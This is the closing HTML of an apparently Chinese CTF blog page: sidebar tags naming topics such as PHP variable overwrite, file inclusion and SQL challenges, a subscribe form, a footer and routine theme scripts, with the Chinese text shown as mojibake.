is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"><span class="tag">phpå˜é‡è¦†ç›–</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><span class="tag">ä¼ªåè®®</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="tag">Buuctf PHPä»£ç å®¡è®¡ æ–‡ä»¶åŒ…å«</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf-SQL/"><span class="tag">Buuctf SQL</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Html%E5%92%8Ccss/"><span class="tag">Htmlå’Œcss</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">è®¢é˜…æ›´æ–°</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="è®¢é˜…"></div></div></form></div></div></div><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/inanb.png" alt="inanb" height="28"></a><p class="size-small"><span>&copy; 2021 inanb</span>Â Â Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a>Â <br><span>Â© ç‰ˆæƒè¯´æ˜ï¼š[æœ¬ç½‘ç«™æ‰€æœ‰å†…å®¹å‡æ”¶é›†äºäº’è”ç½‘æˆ–è‡ªå·±åˆ›ä½œ,<br />&nbsp;&nbsp;&nbsp;&nbsp;æ–¹ä¾¿äºç½‘å‹ä¸è‡ªå·±å­¦ä¹ äº¤æµï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·<a href="/message" target="_blank">ç•™è¨€</a>ï¼Œç«‹å³å¤„ç†]<br /></span><div class="size-small"><span>â¤ï¸æ„Ÿè°¢ <strong><span id="busuanzi_value_site_uv">99+</span></strong> å°ä¼™ä¼´çš„ <strong><span id="busuanzi_value_site_pv">99+</span></strong> æ¬¡å…‰ä¸´ï¼â¤ï¸</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2165337463" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="å›åˆ°é¡¶ç«¯" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..."></div><a class="searchbox-close" href="javascript:;">Ã—</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ...","untitled":"(æ— æ ‡é¢˜)","posts":"æ–‡ç« ","pages":"é¡µé¢","categories":"åˆ†ç±»","tags":"æ ‡ç­¾"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//ä»£è¡¨ç‚¹å‡»é“¾æ¥å°±æ›´æ–°
            selectors: [  //ä»£è¡¨è¦æ›´æ–°çš„èŠ‚ç‚¹
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //åŠ è½½mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // å¼€å§‹ PJAX æ‰§è¡Œçš„å‡½æ•°
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX å®Œæˆä¹‹åæ‰§è¡Œçš„å‡½æ•°ï¼Œå¯ä»¥å’Œä¸Šé¢çš„é‡è½½æ”¾åœ¨ä¸€èµ·
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(false){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('undefined','undefined','undefined','undefined',undefined);});
            }
            if(false){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script></body></html>